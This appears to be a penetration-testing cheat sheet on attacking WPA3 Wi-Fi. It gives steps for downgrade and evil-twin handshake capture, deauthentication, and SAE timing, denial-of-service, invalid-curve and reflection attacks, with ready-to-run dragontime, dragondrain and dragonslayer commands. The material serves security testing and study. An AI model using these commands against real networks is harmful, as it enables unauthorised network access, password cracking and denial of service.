# Attacking WPA3

> Great YouTube video from Clear To Send Channel for WPA3 specification explanation: https://www.youtube.com/watch?v=mjePCRkNb00

---

## WPA3-Transition Downgrade Attack

Allow non WPA3-SAE compliant device to connect using WPA2-PSK.

> **Issue:** WPA2 clients and WPA3 clients will use the same secret passphrase.

**2 techniques can be used:**
1. Capture WPA2-PSK handshake of connecting client and crack the handshake
2. In case no clients use WPA2-PSK you can try to create fake WPA2-PSK and wait for client to connect, capture and crack WPA2 handshake

**Requirements:**
- Same SSID
- Same channel

**Steps:**
1. Identify WPA3 transition network (Check RSN element of beacon frame for both PSK and SAE presence)
2. Create a WPA2-PSK network (any random wrong passphrase)
3. If PMF is enabled wait for the client (if not deauth the client) to make mistake, capture 4-way handshake and run dictionary attack

> Below is the PMF related beacon, PMF is set as required and capable, so the bits are set to 1.

---

## Security Group Downgrade Attack

Force a client to use a weak security group.

**Steps:**
1. Host a WPA3 honeypot and wait for client to connect
2. When client connects, reject the commit message till the time client doesn't use the weak group
3. Once the client connects, capture the dragonfly handshake and crack it

> Not working if weak security groups are not supported by the device.

---

## WPA3-SAE Timing or Cache Password Partitioning

**Reference:** https://github.com/vanhoefm/dragonforce

### Timing Attack using weak group

Timing attacks against the SAE handshake if MODP group 22, 23, or 24 is used. Note that most WPA3 implementations by default do not enable these groups.

```bash
./dragontime -d wlan0 -c 1 -a 11:22:33:44:55:66 -g 27 -i 250 -t 750 -o measurements.txt
```

---

## Denial of Service against WPA3-SAE

Test to which extent an Access Point is vulnerable to denial-of-service attacks against WPA3's SAE handshake. The Dragondrain tool forges Commit messages to cause a high CPU usage on the target.

**Reference:** https://github.com/vanhoefm/dragondrain-and-time

```bash
./dragondrain -d wlan0 -a 01:02:03:04:05:06
```

---

## WPA3-EAP - Invalid Curve Attack

**Reference:** https://github.com/vanhoefm/dragonslayer

**dragonslayer/client.conf:**
```
network = {
    ssid = "WPA3Corpo"
    identity = "jdoe"
    key_mgmt = WPA-EAP
    eap = PWD
    password = "unknown password"
}
```

```bash
sudo ./dragonslayer-client.sh -i wlp2s0 -a 1
```

---

## WPA3-EAP - Reflection Attack

```bash
sudo ./dragonslayer-client.sh -i wlp2s0 -a 0
```

**References:**
- https://github.com/lutzenfried/Methodology/blob/main/03-Wi-Fi.md#attacking-wpa3
